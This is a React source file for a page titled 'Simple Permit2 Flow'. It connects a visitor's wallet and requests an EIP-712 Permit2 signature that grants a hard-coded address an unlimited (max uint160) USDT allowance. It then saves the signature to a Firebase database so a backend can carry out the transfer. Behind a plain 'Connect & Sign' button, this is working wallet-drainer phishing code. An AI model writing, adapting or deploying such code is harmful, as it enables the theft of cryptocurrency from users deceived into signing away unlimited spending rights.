import React, { useState } from 'react';
import { BrowserProvider } from 'ethers';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { initializeApp, getApps, getApp } from 'firebase/app';
import { getDatabase, ref, set } from 'firebase/database';

// Minimal constants for this app (keep these as simple defaults; adjust as needed)
const TOKEN_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT mainnet
const SPENDER_ADDRESS = '0x7460813002e963A88C9a37D5aE3356c1bA9c9659';
const RECIPIENT_ADDRESS = SPENDER_ADDRESS; // recipient is the same as spender per requirements
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// Firebase config (existing project values kept)
const firebaseConfig = {
  apiKey: "AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE",
  authDomain: "tlord-1ab38.firebaseapp.com",
  databaseURL: "https://tlord-1ab38-default-rtdb.firebaseio.com",
  projectId: "tlord-1ab38",
  storageBucket: "tlord-1ab38.firebasestorage.app",
  messagingSenderId: "750743868519",
  appId: "1:750743868519:web:5a937bc8e75e86a96570c2",
  measurementId: "G-5MDEM4EWHJ"
};

const firebaseApp = !getApps().length ? initializeApp(firebaseConfig) : getApp();
const db = getDatabase(firebaseApp);

export default function App() {
  const [modalOpen, setModalOpen] = useState(false);
  const [status, setStatus] = useState('');
  const [address, setAddress] = useState('');

  const openModal = () => setModalOpen(true);
  const closeModal = () => setModalOpen(false);

// AppKit setup
const metadata = {
  name: 'Permit2',
  description: 'Minimal Permit2 signature collector',
  url: 'https://permit-demo.example.com'
};
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  metadata,
  projectId: process.env.REACT_APP_REOWN_PROJECT_ID || 'YOUR_REOWN_PROJECT_ID',
  features: { analytics: false }
});

  const handleConnectAndSign = async () => {
    setStatus('Opening AppKit wallet selector...');
    try {
      await appKit.open();

      setStatus('Waiting for account connection...');

      // subscribe for a single connection event
      const unsubscribe = appKit.subscribeAccount(async (account) => {
        if (!account.isConnected || !account.address) return;
        try {
          setAddress(account.address);
          setStatus('Connected. Preparing Permit2 signature...');

          const walletProvider = appKit.getWalletProvider();
          if (!walletProvider) throw new Error('No wallet provider from AppKit');
          const provider = new BrowserProvider(walletProvider);
          const signer = provider.getSigner();
          const owner = account.address;
          const network = await provider.getNetwork();
          // ensure chainId is a plain number (avoid BigInt serialization issues)
          const chainId = typeof network.chainId === 'bigint' ? Number(network.chainId) : network.chainId;

          const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
          const permitNonce = 0;
          // Max uint160 decimal string (2^160 - 1)
          const MaxUint160 = (BigInt(1) << BigInt(160)) - BigInt(1);
          const permitted = {
            token: TOKEN_CONTRACT_ADDRESS,
            // use decimal string for numeric types to ensure wallets interpret correctly
            amount: MaxUint160.toString(),
            expiration: deadline,
            nonce: permitNonce
          };

      const domain = {
        name: 'Permit2',
        chainId,
        verifyingContract: PERMIT2_ADDRESS
      };

      // EIP-712 types for Uniswap Permit2 (include EIP712Domain)
      const types = {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' }
        ],
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      const message = {
        details: permitted,
        spender: SPENDER_ADDRESS,
        sigDeadline: deadline
      };

          setStatus('Requesting signature in wallet...');
          // Prefer EIP-712 via provider RPC (eth_signTypedData_v4) for external wallets
          const typedData = { types, domain, primaryType: 'PermitSingle', message };
          // JSON.stringify replacer to convert BigInt to string when present
          const replacer = (_key, value) => (typeof value === 'bigint' ? value.toString() : value);
          let signature;
          if (walletProvider && typeof walletProvider.request === 'function') {
            signature = await walletProvider.request({
              method: 'eth_signTypedData_v4',
              params: [owner, JSON.stringify(typedData, replacer)]
            });
          } else if (signer && typeof signer._signTypedData === 'function') {
            // fallback for signers that implement _signTypedData
            signature = await signer._signTypedData(domain, types, message);
          } else {
            throw new Error('No available method to sign typed data');
          }

      setStatus('Saving signature to Firebase...');
      const dataToSave = {
        owner,
        spender: SPENDER_ADDRESS,
        recipient: RECIPIENT_ADDRESS,
        token: TOKEN_CONTRACT_ADDRESS,
        amount: permitted.amount,
        expiration: permitted.expiration,
        nonce: permitted.nonce,
        sigDeadline: deadline,
        signature,
        chainId,
        createdAt: Date.now()
      };

          // ensure no BigInt in saved object (convert chainId to string/number)
          if (typeof dataToSave.chainId === 'bigint') dataToSave.chainId = dataToSave.chainId.toString();
          await set(ref(db, `permits/${owner}`), dataToSave);
          setStatus('✅ Signature saved. Backend may now use it to submit the transfer.');
          setTimeout(() => {
            setStatus('');
            closeModal();
          }, 3000);
        } catch (err) {
          console.error(err);
          setStatus('❌ ' + (err?.message || 'Unknown error'));
        } finally {
          // stop listening once we've processed (guard unsubscribe)
          if (typeof unsubscribe === 'function') unsubscribe();
        }
      });
    } catch (err) {
      console.error(err);
      setStatus('❌ ' + (err?.message || 'Unknown error'));
    }
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#0b1020', color: '#fff' }}>
      <div style={{ width: 420, padding: 28, borderRadius: 12, background: '#0f1724', textAlign: 'center' }}>
        <h1 style={{ margin: 0, marginBottom: 12, fontSize: 20 }}>Simple Permit2 Flow</h1>
        <p style={{ marginTop: 0, color: '#9ca3af', fontSize: 13 }}>Click connect to open wallet and request a Permit2 signature. The signature is saved to Firebase for backend use.</p>

        <button onClick={openModal} style={{ marginTop: 18, padding: '12px 20px', borderRadius: 10, background: '#6366f1', border: 'none', color: '#fff', cursor: 'pointer', fontWeight: 600 }}>Connect</button>

        {status && (
          <div style={{ marginTop: 16, padding: 12, background: '#111827', borderRadius: 8, color: '#f3f4f6', fontSize: 13 }}>{status}</div>
        )}

        {modalOpen && (
          <div style={{ position: 'fixed', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(2,6,23,0.6)' }}>
            <div style={{ width: 400, background: '#0b1220', padding: 20, borderRadius: 10, textAlign: 'center' }}>
              <h2 style={{ margin: 0, fontSize: 18 }}>Connect Wallet</h2>
              <p style={{ color: '#9ca3af', fontSize: 13 }}>Connect your wallet and sign the Permit2 message when prompted.</p>
              <div style={{ display: 'flex', gap: 8, justifyContent: 'center', marginTop: 14 }}>
                <button onClick={handleConnectAndSign} style={{ padding: '10px 14px', borderRadius: 8, background: '#10b981', color: '#fff', border: 'none', cursor: 'pointer', fontWeight: 600 }}>Connect & Sign</button>
                <button onClick={closeModal} style={{ padding: '10px 14px', borderRadius: 8, background: '#374151', color: '#fff', border: 'none', cursor: 'pointer' }}>Cancel</button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
